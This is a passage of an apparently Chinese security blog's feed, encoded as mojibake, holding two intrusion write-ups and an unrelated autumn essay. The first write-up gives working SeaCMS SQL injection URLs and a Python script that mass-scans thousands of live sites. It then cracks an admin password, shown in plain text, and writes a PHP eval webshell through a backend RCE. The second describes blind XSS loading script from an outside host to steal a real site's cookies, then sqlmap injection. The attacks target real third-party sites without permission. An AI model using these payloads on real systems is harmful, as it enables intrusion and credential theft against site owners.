$readrlist;&#125;</code></pre><h3 id="æ¼æ´æˆå› "><a href="#æ¼æ´æˆå› " class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h3><p>$rlistè¿˜æœªè¢«åˆå§‹åŒ–å°±å…ˆè¿›å…¥åˆ°äº†ReadDataå‡½æ•°ï¼Œä½†å®é™…ä¸Š $rlist å¯æ§ï¼Œæœ€ç»ˆReadrlistå‡½æ•°é€ æˆæ³¨å…¥<br>æ¼æ´åˆ©ç”¨Exploitå¦‚ä¸‹(è·å–ç®¡ç†å‘˜è¡¨ä¸­ç¬¬ä¸€ä¸ªç”¨æˆ·çš„å¯†ç )</p><pre><code>http://www.seacms.com/comment/api/index.php?gid=1&amp;page=2&amp;rlist[]=@`%27`,%20extractvalue(1,%20concat_ws(0x20,%200x5c,(select%20(password)from%20sea_admin))),@`%27`</code></pre><p>Exploit2(è·å–ç®¡ç†å‘˜è¡¨ä¸­ç¬¬ä¸€ä¸ªç”¨æˆ·çš„è´¦å·)</p><pre><code>http://www.seacms.net/comment/api/index.php?gid=1&amp;page=2&amp;rlist[]=@`%27`,%20extractvalue(1,%20concat_ws(0x20,%200x5c,(select%20(name)from%20sea_admin))),@`%27`</code></pre><h2 id="0X03å®æˆ˜æ³¨å…¥åˆ©ç”¨"><a href="#0X03å®æˆ˜æ³¨å…¥åˆ©ç”¨" class="headerlink" title="0X03å®æˆ˜æ³¨å…¥åˆ©ç”¨#"></a>0X03å®æˆ˜æ³¨å…¥åˆ©ç”¨<a href="https://www.secquan.org/Discuss/1068831#0X003%E5%AE%9E%E6%88%98%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8">#</a></h2><p>æ‹¿åˆ°expåä¸€ä¸åšäºŒä¸ä¼‘ï¼Œç›´æ¥å†™äº†ä¸ªå‡ è¡Œè„šæœ¬æ€¼äº†ä¸€ä¸‹ç™¾åº¦æƒé‡æ’åå‰10000çš„ç«™ç‚¹:</p><p>codeå¦‚ä¸‹</p><pre><code class="python">import requestsprint(&quot; Seacms v9 SQL Injection-Author:J0o1ey&quot;)urls = open(r&quot;url.txt&quot;, &quot;r&quot;)payload = &#39;/comment/api/index.php?gid=1&amp;page=2&amp;rlist[]=@`%27`,%20extractvalue(1,%20concat_ws(0x20,%200x5c,(select%20(password)from%20sea_admin))),@`%27`&#39;for url in urls:    testurl = url.strip() + payload    html = requests.get(testurl).text    if &quot;seacms&quot; in html:        print(&quot;[+]Exploit URL:&quot; + testurl)</code></pre><p>è™½ç„¶æ¯”è¾ƒç®€é™‹ï¼Œä½†ä¹Ÿå¤Ÿç”¨äº†<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191939045.png" alt="image-20230419193912935"><br>å‘ç°äº†ä¸€ä¸ªç›®æ ‡</p><pre><code>https://www.***.com/comment/api/index.php?gid=1&amp;page=2&amp;rlist[\]=@`%27`,%20extractvalue(1,%20concat_ws(0x20,%200x5c,(select%20(password)from%20sea_admin))),@`%27](https://www.***.com/comment/api/index.php?gid=1&amp;page=2&amp;rlist[]=@`&#39;`, extractvalue(1, concat_ws(0x20, 0x5c,(select (password)from sea_admin))),@`&#39;)`</code></pre><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191939067.png" alt="image-20230419193959041"></p><p>è·å–åˆ°adminç”¨æˆ·çš„md5åŠ å¯†åçš„å¯†ç ä¸ºb93af3cf59d757e27ca5<br>somd5æˆåŠŸè§£å¯†</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191940836.png" alt="image-20230419194011811"></p><p>å¯†ç ä¸ºQq7788520</p><h2 id="0x004æˆåŠŸè·å–åå°"><a href="#0x004æˆåŠŸè·å–åå°" class="headerlink" title="0x004æˆåŠŸè·å–åå°#"></a>0x004æˆåŠŸè·å–åå°<a href="https://www.secquan.org/Discuss/1068831#0x004%E6%88%90%E5%8A%9F%E8%8E%B7%E5%8F%96%E5%90%8E%E5%8F%B0">#</a></h2><p>æ‹¿ç€åå°è·¯å¾„æ‰«æçš„ç¨‹åºçjbä¸€é¡¿ä¹±æ‰«ï¼Œç»“æœå¹¶æ²¡æœ‰æ‰«åˆ°åå°</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191940736.png" alt="image-20230419194057700"><br>å…‰æ‹¿åˆ°ç®¡ç†å‘˜è´¦å·å¯†ç ï¼Œä½†æ˜¯æ²¡æœ‰åå°ï¼Œé‚£æœ‰ä¸ªåµç”¨å•Šã€‚ã€‚ã€‚</p><p>ä½†æ˜¯ï¼Œæˆ‘çœ‰å¤´ä¸€çš±ï¼Œå‘ç°äº‹æƒ…å¹¶ä¸ç®€å•<br>å‰é¢è·å–åˆ°çš„å¯†ç æ˜¯Qq7788520ï¼Œè¿™åº”è¯¥æ˜¯ç®¡ç†å‘˜çš„ä»€ä¹ˆå·å§ï¼Ÿ</p><p>çŒœæµ‹åå°ä¸º<a href="https://www.***.com/7788520">https://www.***.com/7788520</a><br>ç»“æœDuangçš„ä¸€ä¸‹~çœŸtmdæ˜¯åå°ã€‚ã€‚ã€‚ã€‚è¿›å»äº†</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191941534.png" alt="image-20230419194134512"></p><p>ç”¨ä¹‹å‰æ³¨å…¥åˆ°çš„è´¦å·å¯†ç ï¼ŒæˆåŠŸç™»å½•ä¹‹</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191941882.png" alt="image-20230419194153844"></p><h2 id="0x04ä»åå°RCEåˆ°Getshell"><a href="#0x04ä»åå°RCEåˆ°Getshell" class="headerlink" title="0x04ä»åå°RCEåˆ°Getshell#"></a>0x04ä»åå°RCEåˆ°Getshell<a href="https://www.secquan.org/Discuss/1068831#0x004%E4%BB%8E%E5%90%8E%E5%8F%B0RCE%E5%88%B0Getshell">#</a></h2><p>å³ä½¿è¿›äº†åå°ï¼Œæ‹¿ä¸åˆ°shellçš„è¯ï¼Œä¹Ÿæ˜¯å¾ˆé¸¡è‚‹çš„ï¼Œäºæ˜¯æˆ‘ä¾¿æ‰¾äº†ä¸€ä¸‹seacmså…¬å¼€çš„æ¼æ´</p><p>æœ€åæ‰¾åˆ°äº†CVE-2018-14421ï¼Œä¸€ä¸ªSeacms Backendçš„RCE</p><p>æ¼æ´åˆ†ææ–‡ç« ï¼š<a href="https://www.anquanke.com/post/id/152764">https://www.anquanke.com/post/id/152764</a></p><p>æŒ‰ç…§åˆ†ææ–‡ç« ç»™å‡ºçš„æ€è·¯ï¼Œæ³¨å…¥çš„PHPä»£ç æ˜¯ä¸€ä¸²åŸºäºæ¨¡æ¿è¯­æ³•çš„ä»£ç ï¼Œè¿‡æ»¤æ—¶æ²¡æœ‰è¿‡æ»¤$GLOBALSï¼Œå¹¶ä¸”å¯ä»¥æ‹¼æ¥ç»•è¿‡</p><p>åœ¨åå°ç¼–è¾‘videoçš„æ—¶å€™ï¼Œåœ¨å›¾ç‰‡picå¤„æ³¨å…¥ä»£ç </p><pre><code>&#123;if:1)$GLOBALS[&#39;_G&#39;.&#39;ET&#39;][a]($GLOBALS[&#39;_G&#39;.&#39;ET&#39;][b]);//&#125;&#123;end if&#125;</code></pre><p>åˆ©ç”¨payloadæ˜¯</p><pre><code>/details/index.php?1.html&amp;m=admin&amp;a=assert&amp;b=phpinfo()</code></pre><p>å½“ç„¶äº†ï¼Œä¸ä¸€å®šåè¦åƒä½œè€…é‚£æ ·åˆ©ç”¨ï¼Œåªè¦åœ¨è¿™ä¸ªvideoçš„ç…§ç‰‡å‡ºç°çš„åœ°æ–¹é€šè¿‡getæ–¹å¼ä¼ å¯¼phpä»£ç å³å¯</p><p>æˆ‘åœ¨é¦–é¡µä¸Šæ‰¾åˆ°äº†ä¸€ä¸ªå«åšâ€œä¼ è¯´ä¸­çš„ä¸ƒå…¬ä¸»â€çš„videoï¼Œ</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191946480.png" alt="image-20230419194650458"></p><p>åœ¨åå°æœç´¢è¯¥å½±ç‰‡å<br>æˆ‘æŠŠå®ƒçš„ç…§ç‰‡é“¾æ¥å¤„æ”¹ä¸ºäº†</p><pre><code>&#123;if:1)$GLOBALS[&#39;_G&#39;.&#39;ET&#39;][a]($GLOBALS[&#39;_G&#39;.&#39;ET&#39;][b]);//&#125;&#123;end if&#125;</code></pre><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191947576.png" alt="image-20230419194700547"></p><p>éšåæ„é€ å‚æ•°é€šè¿‡fputså‘æ ¹ç›®å½•å†™å…¥webshell:</p><pre><code>http://www.***.com/index.php?1.html&amp;m=admin&amp;a=assert&amp;b=$&#123;fputs(fopen(%27d.php%27,%27w%27),%27%3C?php%20@eval($_POST[c\])?%3E%27</code></pre><p>æˆåŠŸé€šè¿‡RCEåˆ©ç”¨PHPçš„fputså‡½æ•°åœ¨ç½‘ç«™æ ¹ç›®å½•ä¸‹ï¼Œå†™å…¥äº†ä¸€ä¸ªåä¸ºd.phpçš„Webshellï¼ˆå¯†ç ä¸ºcï¼‰</p><p>é«˜é«˜å…´å…´è¿æ¥ä¹‹</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191948232.png" alt="image-20230419194814200"></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
      
      
      
        <tags>
            
            <tag> æ¼æ´æŒ–æ˜ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é»„å¶åœ°</title>
      <link href="/2018/10/27/%E9%BB%84%E5%8F%B6%E5%9C%B0/"/>
      <url>/2018/10/27/%E9%BB%84%E5%8F%B6%E5%9C%B0/</url>
      
        <content type="html"><![CDATA[<p>ç›¸åŒçš„å¤œï¼Œç›¸åŒçš„äººï¼Œæ‹¿ç€ç›¸åŒçš„ç¬”ï¼Œå†™ç€è‡ªå·±çš„éšç¬”ã€‚</p><p>è¿™æ­£æ˜¯åŒ—å›½çš„ç§‹å¤©ã€‚</p><p>è¢…è¢…å…®ç§‹é£ï¼Œæ´åº­æ³¢å…®æœ¨å¶ä¸‹ã€‚æ— è®ºæ˜¯å±±æ—é—´ï¼Œæ¹–ç•”æ—ï¼Œæˆ–æ˜¯æ ¡å›­ä¸­ï¼Œæ¯ä¸€æ£µæ ‘æœ¨éƒ½è¿›è¡Œç€ä¸€ç§ç‰¹æ®Šçš„å‘Šåˆ«ã€‚</p><p>æ— è®ºè¿™ä¸–ç•Œæ€æ ·ç»å†æ²§æµ·æ¡‘ç”°ä¹‹å˜ï¼Œç§‹é›¨æ·…æ²¥æ²¥æ²¥çš„å¤œé‡Œï¼Œæ€»ä¼šå¬åˆ°è½å¶ä¹‹å£°ã€‚</p><p>è¿™æ˜¯æ³¨å®šåŒ…è£¹ä»–ä»¬çš„ç”Ÿå‘½ä»ªå¼ã€‚</p><p>å¾…åˆ°ç¡çœ¼æƒºå¿ªçš„äººä»åºŠä¸Šé†’æ¥ï¼Œç•¥å¸¦ç¡æ„åœ°èµ°å‡ºæˆ¿é—¨ï¼Œé›¨åæ±¹æ¶Œè¢­æ¥çš„å¯’æ„è®©ä»–æ‰“äº†ä¸ªå¯’é¢¤ï¼Œæ¸…é†’äº†å‡ åˆ†ã€‚æ“¦äº®çœ¼ç›ï¼Œä»–é€‰æ‹©ä»°è§‚ç¢§äº‘ä¹‹å¤©ï¼Œä¿¯å¯Ÿé»„å¶ä¹‹åœ°ã€‚</p><p>æ ‘æœ¨ä¸€å¤œä¹‹é—´çºµæƒ…æ‰€æ¬²ï¼Œé€‰æ‹©æŠŠæ‰€æœ‰æµåŠ¨ç€çº¯ç²¹çš„é²œç»¿æ±æ¶²çš„å¶å­é“¸æˆé‡‘å¸ï¼Œåœ¨é›¨å¤œä¸­å°½æƒ…æŒ¥æ’’ï¼Œæ²™æ²™ä½œå“ï¼Œè¿™é»„å¶çºµç„¶è½åˆ°åœ°ä¸‹ï¼Œè¿™ä¹Ÿä¸å¤±ä¸ºä¸€ç§æ·åœ°æœ‰å£°çš„é¦ˆèµ ã€‚</p><p>äººä»¬ä¼¼ä¹å¯¹è¿™èˆ¬å¤§è‡ªç„¶çš„èµ ç¤¼å¤±å»äº†å…´è¶£ï¼Œå¹¶ä¸æ— å…´è¶£èº¬èº«æ‹¾èµ·ã€‚</p><p>æ—¥å‡ºä¸œå—éš…ï¼Œç…§åœ¨ä»–çš„è„¸ä¸Šã€‚æ™“éœ²åˆæ­‡ï¼Œç‹¬è¡Œä¹‹äººå¼¯ä¸‹è…°æ‹¾èµ·äº†å‡ ç‰‡é»„å¶ã€‚</p><p>ä»–æŠŠå¶å­æ”¾åœ¨é˜³å…‰ä¹‹ä¸‹ï¼Œå¶å­ä¸Šçš„éœ²æ°´æŠ˜å°„å‡ºäº†å‡ åˆ†åŠ¨äººçš„å…‰æ™•ã€‚</p><p>ä»–ç¬‘äº†ä¸‹ï¼Œæˆ–è®¸æ‰€è°“çš„ä¸€å¶çŸ¥ç§‹ä¾¿æ˜¯å¦‚æ­¤ï¼Œå±±æ²³è¡¨é‡Œï¼Œå°½åœ¨è¿™æ ‘å¶ä¹‹ä¸­ã€‚</p><p>è¿™ç‰‡æ ‘å¶æ‹¥æœ‰äº†é‚£ä»½é£é£ç«ç«çš„å†·å†·æ¸…æ¸…ã€‚</p><p>çº¯ç²¹ä¸”çƒ­çƒˆï¼Œæœ¬çœŸä¸”å†·æ¸…ã€‚</p><p>ä»–é€‰æ‹©æŠŠæ ‘å¶å¤¹åœ¨äº†ä¸€æœ¬ç²¾è£…çš„é»‘è‰²ä¹¦é‡Œâ€”â€”ç‹å°æ³¢çš„ã€Šé»„é‡‘æ—¶ä»£ã€‹ã€‚</p><p>è¿™æ˜¯ä»–çš„é»„é‡‘æ—¶ä»£ï¼Œä¹Ÿæ˜¯è¿™ç‰‡æ ‘å¶çš„é»„é‡‘æ—¶ä»£ã€‚</p><p>æˆ–è®¸ç­‰åˆ°å¯’å†¬åˆ°æ¥ä¹‹æ—¶ï¼Œä»–æ— åŠ›ç•…æ¸¸å±±æ—ä¹‹é—´ã€‚é‚£ä¹ˆä»–æ‰“å¼€è¿™æœ¬ä¹¦ï¼Œå‡‘è¿‘ä¸€é—»ï¼Œæˆ–è®¸ä¼šæ„Ÿå—åˆ°å±±æ—çš„æ°”æ¯ï¼Œå°†ä¸åŒçš„æ ‘å¶æ‹¼å‡‘å‡ºå‡ ç»„ç¥å¥‡çš„å›¾æ¡ˆï¼Œé‚£å°±æ›´æœ‰æ„æ€äº†ã€‚</p><p>ä»–éæƒ³ç€ä¸€åˆ‡ï¼Œæ—¥è½è¥¿å±±ã€‚</p><p>é»„æ˜ä¸‹ï¼Œæµªå­åœåœ¨è·¯æ—ï¼Œå¯¹ç€å…‰ç§ƒç§ƒçš„æ ‘å¹²å’Œæ»¡åœ°çš„é»„å¶å‘å‘†ã€‚</p><p>æ ‘å¶ç¦»å¼€äº†æå¹²ï¼ŒèŠ±ç“£ç¦»å¼€äº†èŠ±æœµã€‚å±±æ˜ æ–œé˜³å¤©æ¥æ°´ï¼ŒèŠ³è‰æ— æƒ…ã€‚</p><p>é»¯ä¹¡é­‚ï¼Œè¿½æ—…æ€ã€‚æ°¸è¿œå‘ç€åŒ—æ–¹ï¼Œç‹¬è¡Œçš„æµªå­æƒ³å›åˆ°æ•…ä¹¡äº†ï¼Œä½†ä»–å¹¶ä¸çŸ¥é“æ•…ä¹¡åœ¨å“ªã€‚å› æ­¤ä»–é‚£æ— å°½çš„æ—…ç¨‹æ˜¯éš¾ä»¥è¨€è¯´çš„æ¼«é•¿ã€‚</p><p>åŸæ¥ä¸€åˆ‡ä¼—ç”Ÿï¼Œå‡¡æ˜¯åŒæ ¹ï¼Œå‡¡å±è¡€æ€§ï¼Œçš†æœ‰åŒæ„Ÿã€‚</p><p>ä¹Ÿè®¸ä»–ä¿©éƒ½åƒä¸‰æ¯›å†™çš„é‚£æ ·ï¼š</p><blockquote><p>â€œå¦‚æœæœ‰æ¥ç”Ÿï¼Œâ€‚<br>è¦åšä¸€æ£µæ ‘ï¼Œâ€‚<br>ç«™æˆæ°¸æ’ï¼Œâ€‚<br>æ²¡æœ‰æ‚²æ¬¢çš„å§¿åŠ¿ã€‚â€‚<br>ä¸€åŠåœ¨åœŸé‡Œå®‰è¯¦ï¼Œâ€‚<br>ä¸€åŠåœ¨é£é‡Œé£æ‰¬ï¼Œâ€‚<br>ä¸€åŠæ´’è½é˜´å‡‰ï¼Œâ€‚<br>ä¸€åŠæ²æµ´é˜³å…‰ï¼Œâ€‚<br>éå¸¸æ²‰é»˜éå¸¸éª„å‚²ï¼Œâ€‚<br>ä»ä¸ä¾é ï¼Œä»ä¸å¯»æ‰¾ã€‚â€</p></blockquote><p>é£é“ƒå“äº†ï¼Œæ‹¿ç€æ‹¾èµ·çš„é»„å¶ï¼Œåœ¨æ€€é‡Œç¡å»å§ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> ç”Ÿæ´»å¶æ‚Ÿ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è®°ä¸€æ¬¡ä»¥å°å‹ƒå¤§ï¼Œç´§å¼ åˆºæ¿€çš„æ¸—é€æµ‹è¯•</title>
      <link href="/2018/07/07/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%A5%E5%B0%8F%E5%8B%83%E5%A4%A7%EF%BC%8C%E7%B4%A7%E5%BC%A0%E5%88%BA%E6%BF%80%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
      <url>/2018/07/07/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%A5%E5%B0%8F%E5%8B%83%E5%A4%A7%EF%BC%8C%E7%B4%A7%E5%BC%A0%E5%88%BA%E6%BF%80%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<h2 id="ä¸€ã€èµ·å› "><a href="#ä¸€ã€èµ·å› " class="headerlink" title="ä¸€ã€èµ·å› "></a>ä¸€ã€èµ·å› </h2><p>emmmï¼Œç‚ç‚å¤æ—¥åˆ°æ¥ï¼Œè¿™ä¹ˆä¸ªæ¡‘æ‹¿å¤©å¹²ä»€ä¹ˆå¥½å‘¢ï¼Ÿ</p><p>æ²¡é”™ï¼Œä¸€å®šè¦ååœ¨å®¶é‡Œï¼Œå¹ç€ç©ºè°ƒï¼Œåƒç€è¥¿ç“œï¼Œç„¶åé™é™åœ°æŒ–æ´ã€‚æŒ–æ´å®Œå«ä¸ªå¤–å–ï¼Œå–ç€å•¤é…’ï¼Œæ’¸ç€çƒ§çƒ¤ï¼Œå²‚ä¸ç¾å“‰ï¼Ÿç„¶æ­¤å¯ä¸ºæ™ºè€…é“ï¼Œéš¾ä¸ºä¿—äººè¨€ä¹Ÿã€‚ã€‚ã€‚æ­£åœ¨æˆ‘æ²‰è¿·åœ¨å¯¹å¤æ—¥çš„æ„æ·«ä¹‹æ—¶ï¼Œæˆ‘äº²çˆ±çš„å¦ˆå¦ˆå¿½ç„¶ç»™æˆ‘æ¥äº†ä¸€æ³¢å¤ºå‘½è¿ç¯callã€‚<br><img src="https://s2.loli.net/2023/04/19/AkbOQ8mXJrWGciF.png" alt="image"></p><pre><code>å¤§æ¦‚å†…å®¹å¦‚ä¸‹ï¼š   --å¦ˆå¦ˆï¼šå„¿å‘€ã€‚ã€‚ã€‚ä½ å°å¸ƒéšç§ï¼ˆè®¤ä¸è®¤è¯†ï¼‰æå…¬åŠ¡å‘˜åŸ¹è®­çš„æœºæ„ï¼Œå¸®æˆ‘åœ¨ç½‘ä¸Šç…ç…å»ï¼Œæˆ‘æœ‰ä¸ªæœ‹å‹ä»–å„¿æƒ³è€ƒå…¬åŠ¡å‘˜~   --æˆ‘ï¼šï¼ˆå£°éŸ³ç¬‘å˜»å˜»ï¼Œå¿ƒé‡Œmmpï¼‰å“å‘€ï¼Œè¿™ä¸ªbiaçš„å¤©ï¼Œæå®¶é‡Œç¡è§‰è¡Œäº†ã€‚ã€‚åˆ«å¼„äº†ã€‚ã€‚   --å¦ˆå¦ˆï¼šMLGBï¼Œå«ä½ æ•´ï¼Œä½ å°±å¿«ç‚¹çš„ï¼Œæ™šä¸Šç»™æˆ‘å›ç”µè¯ã€‚     å“ï¼Œçˆ¶æ¯ä¹‹å‘½ä¸å¯è¿ï¼Œæ‚²ä¼¤çš„æˆ‘åªèƒ½æ”¾ä¸‹æ‰‹é‡Œçš„é”®ç›˜å’Œç“œçš®ï¼Œå¼€å§‹å»ç™¾åº¦ä¸Šæ‰¾åŸ¹è®­æœºæ„ã€‚</code></pre><p><img src="https://s2.loli.net/2023/04/19/8SXb7ntzhoQa1VW.png" alt="image"></p><p>ç™¾åº¦ä¸Šé¢æ‰¾äº†å¥½ä¹…ï¼Œéƒ½æ²¡æ‰¾åˆ°å¤ªåˆé€‚çš„ã€‚é—®äº†é—®èº«è¾¹çš„æœ‹å‹ï¼šæœ‹å‹ç»™äº†ä¸€å®¶ç½‘æ ¡çš„æŠ¥ååœ°å€<br><a href="http://xxxxx.com/3g/***/2203947.htm">http://xxxxx.com/3g/***/2203947.htm</a><br><img src="https://s2.loli.net/2023/04/19/XGxvwty2PqhbYFm.png" alt="image"></p><p>æ²¡é”™ï¼Œè¿˜å¸¦å…è´¹è¯•å­¦ã€‚ã€‚ã€‚çœŸçš„å…ˆè¿›ã€‚ã€‚ã€‚ã€‚<br>äºæ˜¯æ‰“å¼€çˆ±ç«™æŸ¥äº†ä¸€æ³¢æƒé‡ã€‚ã€‚ã€‚<br><img src="https://s2.loli.net/2023/04/19/7h8WRjPqx2pzUti.png" alt="image"></p><p>è¿™å°¼ç›ï¼Ÿï¼Ÿï¼Ÿç™¾åº¦æƒ7ï¼Œemmmï¼Œæœ‰ç‚¹æ„æ€ã€‚è§åˆ°è¿™ä¹ˆé«˜æƒé‡çš„ç«™ï¼Œé‚£æ—¶æˆ‘å·²é¥¥æ¸´éš¾è€ï¼Œä¾¿å†³å®šå¯¹æ­¤ç«™ç‚¹æ¥ä¸€æ³¢æ¸—é€æµ‹è¯•ã€‚</p><h2 id="äºŒã€XSSç›²æ‰“ï¼Ÿå®‰æ’ä¸€ä¸‹"><a href="#äºŒã€XSSç›²æ‰“ï¼Ÿå®‰æ’ä¸€ä¸‹" class="headerlink" title="äºŒã€XSSç›²æ‰“ï¼Ÿå®‰æ’ä¸€ä¸‹"></a>äºŒã€XSSç›²æ‰“ï¼Ÿå®‰æ’ä¸€ä¸‹</h2><p><img src="https://s2.loli.net/2023/04/19/TBtgFWdhwo1rHva.png" alt="image"></p><p>çœ‹åˆ°è¿™é‡Œï¼Œå°ä¼™ä¼´ä»¬è‚¯å®šæƒ³ã€‚ã€‚ã€‚emmï¼Œæ˜¯ä¸æ˜¯å¯ä»¥XSSæ‰“ä¸€ä¸‹è¯•è¯•å‘¢ï¼Ÿ<br>è¯´å¹²å’±å°±å¹²ã€‚ã€‚ã€‚è§æ¡†å°±æ’,æ¥ä¸‹æ¥å°±æ’å…¥xss payloadè¯•è¯•å§ã€‚ã€‚ã€‚<br>Payload: <code>&lt;/textarea&gt;&lt;script src=&quot;=&quot;http://xsspt.com/z6ocdy?1531815744&quot;&gt;&lt;/script&gt;</code><br>å°†payloadå®Œæ•´é»è´´è¿›å»ï¼Œå¦‚å›¾å‘ç°ä»…æœ‰&lt;&#x2F;tex    è¿™å››ä¸ªå­—ç¬¦<br><img src="https://s2.loli.net/2023/04/19/qlosKBVe4MQ7wnT.png" alt="image"></p><p>å®¡æŸ¥å…ƒç´ çœ‹ä¸‹ï¼Œåœ¨è¡¨å•å¤„ç†ä¸Šè®¾ç½®äº†maxlengthï¼Œç›´æ¥å®¡æŸ¥å…ƒç´ å¤§æ³•æ”¹æ‰å°±å¥½äº†<br>max lengthæ”¹ä¸º999<br><img src="https://s2.loli.net/2023/04/19/INOkbRoaCGU2trM.png" alt="image"><br> ç„¶åæˆ‘ä»¬çš„XSS Payloadå°±å¯ä»¥æ­£å¸¸åœ°å…¨éƒ¨è¾“å…¥åˆ°è¡¨å•ä¸­äº†<br><img src="https://s2.loli.net/2023/04/19/rEiRl8Oez6Y4Nbf.png" alt="image"></p><p>æ‰‹æœºé‚£ä¸ªæ–‡æœ¬æ¡†ï¼Œæˆ‘éšä¾¿å¡«äº†11ä½æ•°å­—ï¼Œç„¶åç‚¹å‡»æäº¤ï¼Œä¸‡å¹¸çš„çš„æ˜¯æäº¤æˆåŠŸäº†ï¼ˆåç«¯æ²¡å¯¹å†…å®¹è¿›è¡ŒéªŒè¯ï¼‰<br>è¿‡äº†å¤§æ¦‚1ä¸ªå°æ—¶ï¼Œçªç„¶XSSå¹³å°çš„é‚®ä»¶æ¥äº†ï¼Œå…´å¥‹ingã€‚ã€‚ã€‚ï¼ˆå®¢æœæ˜¯çœŸçš„æ•¬ä¸šï¼‰<br><img src="https://s2.loli.net/2023/04/19/jFwefGsIN4zWPhA.png" alt="image"></p><p>æ‹¿ç€cookieï¼ŒæŒ‚å¥½ä»£ç†å‚»å•¦å§å”§åœ°å°±æ˜¯è¿›å…¥åå°ä¸€æ³¢æµè§ˆï¼Œå‘ç°æƒé™éå¸¸å°ï¼ŒåŸºæœ¬ä¸Šåªèƒ½å¤„ç†å¤„ç†å®¢æœå·¥ä½œ<br><img src="https://s2.loli.net/2023/04/19/CDsozeBltMFfQnK.png" alt="image"></p><p>ä¸è¿‡å¯ä»¥æŸ¥çœ‹åå°çš„ç®¡ç†å‘˜è´¦å·ã€‚ã€‚ã€‚ã€‚ã€‚ï¼ˆæœç„¶æ˜¯ä¸ªå¤§ç«™ï¼Œåå°åˆ†å·¥æƒé™è¿™ä¹ˆè®²ç©¶ã€‚ã€‚ã€‚ï¼‰<br><img src="https://s2.loli.net/2023/04/19/ENcTCxLXKJve3qi.png" alt="image"></p><p>çœ‹ç€è¿™ä¹ˆå¤šçš„è¶…çº§ç®¡ç†å‘˜è´¦å·ï¼Œè€Œæˆ‘å´åªæ˜¯ä¸ªåŠæ¯›å®¢æœï¼ŒåŸºæœ¬ä¸Šæ²¡ä»€ä¹ˆæƒé™ï¼Œå¿ƒé‡ŒçœŸçš„éš¾å—çš„ä¸€æ‰¹ã€‚ã€‚<br>éš¾é“æˆ‘ä»¬çš„æ¸—é€åˆ°è¿™é‡Œå°±è¦ç»“æŸï¼Ÿï¼Ÿä¸å¯èƒ½ï¼Œè¿™æ˜¾ç„¶ä¸ç¬¦åˆæœ¬å±Œçš„é£æ ¼ã€‚ã€‚ã€‚<br><img src="https://s2.loli.net/2023/04/19/7caIFXZzemCRuVf.png" alt="image"></p><p>äºæ˜¯æˆ‘åˆä»”ç»†åœ°ç¿»äº†ç¿»åå°ï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰åœ°æ–¹å¯ä»¥æ¥ä¸€æ³¢éªšæ“ä½œã€‚ã€‚ã€‚</p><h2 id="ä¸‰ã€åå°SQLæ³¨å…¥ï¼Ÿè®²ç©¶"><a href="#ä¸‰ã€åå°SQLæ³¨å…¥ï¼Ÿè®²ç©¶" class="headerlink" title="ä¸‰ã€åå°SQLæ³¨å…¥ï¼Ÿè®²ç©¶"></a>ä¸‰ã€åå°SQLæ³¨å…¥ï¼Ÿè®²ç©¶</h2><p>å¤§å®¶å¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„å®¢æœå¤„ç†ç•Œé¢æ˜¯å¯ä»¥è¿›è¡ŒæŸ¥è¯¢çš„ï¼ŒæŸ¥è¯¢çš„è¿‡ç¨‹æ˜¯é€šè¿‡GETæ–¹å¼ä¼ å¯¼ä¸€ä¸ªmobileå‚æ•°å®ç°æŸ¥è¯¢</p><p>æˆ‘ä»¬ç›´æ¥FUZZäº†ä¸€ä¸‹SQLæ³¨å…¥çš„Payloadï¼Œçœ‹çœ‹æ˜¯å¦å­˜åœ¨æ³¨å…¥ã€‚</p><p>å‘ç°ä¼ é€’ç‰¹æ®Šå­—ç¬¦åï¼Œé¡µé¢æ²¡æœ‰è¿”å›ä¿¡æ¯ï¼Œé‚£ä¹ˆå°±å¾ˆæœ‰å¯èƒ½å­˜åœ¨SQLæ³¨å…¥ã€‚<br><img src="https://s2.loli.net/2023/04/19/5yzX2oJbgBaNnGY.png" alt="image"></p><p>æˆ‘ä»¬ä½¿ç”¨BurpSuiteæ¥æŠ“å–æœ¬å‡ºçš„çš„HTTPè¯·æ±‚ï¼Œç„¶åä¿å­˜åœ¨C:\Users\Samsung 700Z5C\Desktop\1.txtä¸­<br><img src="https://s2.loli.net/2023/04/19/7UEgMCSLybF4YIH.png" alt="image"></p><p>æ¥ä¸‹æ¥åˆ°äº†ä»¥å°å‹ƒå¤§ï¼Œç´§å¼ åˆºæ¿€çš„æ—¶åˆ»ï¼Œä½¿ç”¨SQLMAPçš„ -rå‚æ•°ï¼Œæ³¨å…¥æœ¬HTTPè¯·æ±‚<br><code>sqlmap -r C:\Users\Samsung 700Z5C\Desktop\1.txt</code><br><img src="https://s2.loli.net/2023/04/19/FQko9HntjrMm5T4.png" alt="image"></p><p>æ³¨å…¥æˆåŠŸäº†ã€‚å“ˆå“ˆå“ˆã€‚ã€‚ã€‚ã€‚æˆ‘ä»¬å¼€å§‹ç›´å¥”ç®¡ç†å‘˜çš„è¡¨<br>å‘½ä»¤ä¸º<code>sqlmap -r C:\Users\Samsung 700Z5C\Desktop\1.txt --tables -D &quot;nd_net&quot; </code>     &#x2F;&#x2F;åˆ—å‡ºnd_netæ•°æ®åº“çš„è¡¨<br><img 